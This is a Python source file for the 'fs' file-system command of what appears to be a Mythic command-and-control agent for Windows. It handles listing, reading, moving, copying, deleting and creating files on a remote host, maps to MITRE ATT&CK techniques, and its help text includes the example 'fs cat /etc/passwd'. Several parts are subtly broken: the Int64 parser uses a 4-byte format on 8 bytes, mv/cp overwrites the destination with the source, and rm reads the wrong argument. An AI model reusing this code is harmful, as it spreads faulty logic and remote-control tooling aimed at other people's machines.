from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *

import struct

SB_FS_LS    = 30;
SB_FS_CAT   = 31;
SB_FS_PWD   = 32;
SB_FS_CD    = 33;
SB_FS_MV    = 34;
SB_FS_CP    = 35;
SB_FS_DEL   = 36;
SB_FS_MKDIR = 37;

class Parser:
    buffer: bytes = b'';
    length: int   = 0;

    def __init__( self, buffer, length ):

        self.buffer = buffer;
        self.length = length;

        return;

    def Int16( self ):

        val = struct.unpack( ">h", self.buffer[ :2 ] );
        self.buffer = self.buffer[ 2: ];

        return val[ 0 ];

    def Int32( self ) -> int:

        val = struct.unpack( ">i", self.buffer[ :4 ] );
        self.buffer = self.buffer[ 4: ];

        return val[ 0 ];

    def Int64( self ):

        val = struct.unpack( ">i", self.buffer[ :8 ] );
        self.buffer = self.buffer[ 8: ];

        return val[ 0 ];

    def Bytes( self ) -> bytes:

        length      = self.Int32();

        buf         = self.buffer[ :length ];
        self.buffer = self.buffer[ length: ];

        return buf;

    def Pad( self, length: int ) -> bytes:

        buf         = self.buffer[ :length ];
        self.buffer = self.buffer[ length: ];

        return buf;

    def Str( self ) -> str:
        return self.Bytes().decode('utf-8', errors="ignore");
    
    def Wstr( self ):
        return self.Bytes().decode( 'utf-16' );

    def All( self ) -> bytes:
        remaining = self.buffer
        self.buffer = b''
        return remaining

class FsArguments( TaskArguments ):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        
        self.args = [
            CommandParameter(
                name        = "action",
                type        = ParameterType.ChooseOne,
                description ="Action to execute",
                choices=["ls", "cat", "pwd", "cd", "mv", "cp", "rm", "mkdir"],
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=True,
                        group_name="Default",
                        ui_position=1
                    )
                ]
            ),
            CommandParameter(
                name        = "path",
                type        = ParameterType.String,
                description = "Path for directory operations",
                parameter_group_info = [
                    ParameterGroupInfo(
                        required    = False,
                        group_name  = "Default",
                        ui_position = 2
                    ),
                    ParameterGroupInfo(
                        required=False,
                        group_name="path",
                        ui_position=2
                    )
                ]
            ),
            CommandParameter(
                name        = "file",
                type        = ParameterType.String,
                description = "File to read",
                parameter_group_info = [
                    ParameterGroupInfo(
                        required    = False,
                        group_name  = "Default",
                        ui_position = 2
                    ),
                    ParameterGroupInfo(
                        required    = False,
                        group_name  = "file",
                        ui_position = 2
                    )
                ]
            ),
            CommandParameter(
                name        = "source",
                type        = ParameterType.String,
                description = "Source file/directory",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False,
                        group_name="Default",
                        ui_position=2
                    ),
                    ParameterGroupInfo(
                        required=False,
                        group_name="src",
                        ui_position=2
                    )
                ]
            ),
            CommandParameter(
                name        = "destination",
                type        = ParameterType.String,
                description = "Destination file/directory",
                parameter_group_info = [
                    ParameterGroupInfo(
                        required    = False,
                        group_name  = "Default",
                        ui_position = 3
                    ),
                    ParameterGroupInfo(
                        required    = False,
                        group_name  = "dst",
                        ui_position = 3
                    )
                ]
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise ValueError("Must supply arguments")
        
        if self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)
        else:
            # Handle command line parsing for non-JSON input
            parts = self.command_line.split()
            if not parts:
                raise ValueError("Must supply arguments")
                
            action = parts[0]
            self.add_arg("action", action)
            
            if action == "pwd":
                return
                
            if action in ["ls", "cd", "rm", "mkdir"]:
                if len(parts) > 1:
                    self.add_arg("path", " ".join(parts[1:]))
                    
            elif action == "cat":
                if len(parts) > 1:
                    self.add_arg("file", " ".join(parts[1:]))
                else:
                    raise ValueError("File parameter is required for cat action")
                    
            elif action in ["mv", "cp"]:
                if len(parts) > 2:
                    self.add_arg("source", parts[1])
                    self.add_arg("destination", " ".join(parts[2:]))
                else:
                    raise ValueError("Both source and destination parameters are required")

    async def parse_dictionary(self, dictionary):
        if "action" not in dictionary:
            self.load_args_from_dictionary (dictionary );
            return
            
        action = dictionary["action"]
        self.add_arg("action", action)
        
        if action == "pwd":
            return
        
        if "-path" in dictionary:
            self.add_arg("path", dictionary["-path"])
        elif "path" in dictionary:
            self.add_arg("path", dictionary["path"])
        
        if "-file" in dictionary:
            self.add_arg("file", dictionary["-file"])
        elif "file" in dictionary:
            self.add_arg("file", dictionary["file"])
        
        if action in ["mv", "cp"]:
            if "-source" in dictionary:
                self.add_arg("source", dictionary["-source"])
            elif "-src" in dictionary:
                self.add_arg("source", dictionary["-src"])
            elif "source" in dictionary:
                self.add_arg("source", dictionary["source"])
            elif "src" in dictionary:
                self.add_arg("source", dictionary["src"])
            
            if "-destination" in dictionary:
                self.add_arg("destination", dictionary["-destination"])
            elif "-dst" in dictionary:
                self.add_arg("destination", dictionary["-dst"])
            elif "destination" in dictionary:
                self.add_arg("destination", dictionary["destination"])
            elif "dst" in dictionary:
                self.add_arg("destination", dictionary["dst"])

class FsCommand( CommandBase ):
    cmd         = "fs"
    needs_admin = False
    help_cmd    = \
    """
    File System Operations

    Usage:
    fs <action> [arguments]

    Actions:
    ls [-path <path>]       - List directory contents (default: current directory)
    cat <file>              - Display file contents
    pwd                     - Print working directory
    cd [<path>]             - Change directory (default: home directory)
    mv <source> <dest>      - Move/rename file or directory
    cp <source> <dest>      - Copy file or directory
    rm <path>               - Remove file or directory
    mkdir <path>            - Create directory

    Examples:
    fs ls -path /tmp
    fs ls /tmp               # Alternative syntax
    fs cat /etc/passwd
    fs pwd
    fs mv old.txt new.txt
    fs cp file.txt /backups/
    fs rm /tmp/junk
    fs mkdir /new/folder
    """
    description = "File system operations command with multiple actions";
    version     = 1;
    author      = "@ Oblivion";
    attackmapping  = ["T1083", "T1106", "T1570"];
    browser_script = BrowserScript( "ls", "@ Oblivion" );
    argument_class = FsArguments;
    attributes     = CommandAttributes(
        supported_os = [SupportedOS.Windows],
        builtin      = True
    );

    async def create_go_tasking( self, task: PTTaskMessageAllData ) -> PTTaskCreateTaskingMessageResponse:
        action = task.args.get_arg("action")
        display_params = action
        
        if action in ["mv", "cp"]:
            source = task.args.get_arg("source", "")
            destination = task.args.get_arg("destination", "")
            display_params += f" {source} {destination}"

            task.args.add_arg( "src", source );
            task.args.add_arg( "destination", source );
            
        elif action == "ls":
            path = task.args.get_arg("path")
            if path is None:
                path = ".\\*"
            elif path != "\\*":
                path = path + "\\*"
            display_params += f" {path.replace("\\*", "")}"

            task.args.add_arg( "path", path );
            
        elif action == "cat":
            file = task.args.get_arg("file", "")
            if not file:
                raise ValueError("File parameter is required for cat action")
            display_params += f" {file}"

            task.args.add_arg( "file", file );
            
        elif action == "cd":
            path = task.args.get_arg("path", "~")
            display_params += f" {path}"

            task.args.add_arg( "path", path );
            
        elif action == "rm":
            file = task.args.get_arg("file", "")  # Note: using 'file' parameter for rm
            if not file:
                raise ValueError("File parameter is required for rm action")
            display_params += f" {file}"

            task.args.add_arg( "file", file );

        elif action == "mkdir":
            path = task.args.get_arg("path", "")
            if not path:
                raise ValueError("Path parameter is required for mkdir action")
            display_params += f" {path}"
            task.args.add_arg( "path", path );
        
        return PTTaskCreateTaskingMessageResponse(
            TaskID=task.Task.ID,
            Success=True,
            DisplayParams = display_params,
        )

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
            try:
                if not response:
                    return PTTaskProcessResponseMessageResponse(
                        TaskID  = task.Task.ID,
                        Success = True
                    )
                    
                RawResponse = bytes.fromhex( response )
                Psr     = Parser( RawResponse, len( RawResponse ) );
                Output  = "";

                sub_id = int.from_bytes( Psr.Pad( 1 ), byteorder="big" );

                if sub_id == SB_FS_LS:
                    Output += "=" * 150 + "\n";
                    Output += f"{'Attr':<6} || {'Name':<60} || {'Size':<6} || {'Created':<20} || {'Modified':<20} || {'Accessed':<20}\n";
                    Output += "=" * 150 + "\n";

                    while Psr.buffer:
                        try:
                            FileName  = Psr.Str();
                            FileSize  = Psr.Int32();
                            Atrribute = Psr.Int32();
                            
                            def TimePsr():
                                Day    = Psr.Int16();
                                Month  = Psr.Int16();
                                Year   = Psr.Int16();
                                Hour   = Psr.Int16();
                                Minute = Psr.Int16();
                                Second = Psr.Int16();

                                return f"{Year:04d}-{Month:02d}-{Day:02d} {Hour:02d}:{Minute:02d}:{Second:02d}";

                            CreatedTime = TimePsr()
                            LastAccess  = TimePsr()
                            Modified    = TimePsr()

                            AttrMap = {
                                0x1: "R", 0x2: "H", 0x4: "S",
                                0x10: "D", 0x20: "A", 0x40: "N", 0x80: "T"
                            }
                            attr_str = "".join(v for k, v in AttrMap.items() if Atrribute & k) or "?"

                            Output += f"{Atrribute:<6} || {FileName:<60} || {FileSize:<6} || {CreatedTime:<20} || {Modified:<20} || {LastAccess:<20}\n"

                        except struct.error:
                            break

                    Remaining = len( Psr.All() );
                    if Remaining > 0:
                        Output += f"\nWarning: {Remaining} unparsed bytes remaining\n"

                elif sub_id == SB_FS_CAT or sub_id == SB_FS_PWD:
                    Output = Psr.Str();
                
                else:
                    BooleanTask = Psr.Int32();

                    if BooleanTask == 1:
                        Output = "Task Executed with Success";
                    else:
                        Output = "Task Failed";
                    

                await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                    TaskID   = task.Task.ID,
                    Response = Output
                ))

                return PTTaskProcessResponseMessageResponse(
                    TaskID  = task.Task.ID,
                    Success = True
                )

            except Exception as e:
                await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                    TaskID   = task.Task.ID,
                    Response = f"Error processing response: {str(e)}".encode('utf-8')
                ))

                return PTTaskProcessResponseMessageResponse(
                    TaskID  = task.Task.ID,
                    Success = False,
                    Error   = str(e)
                )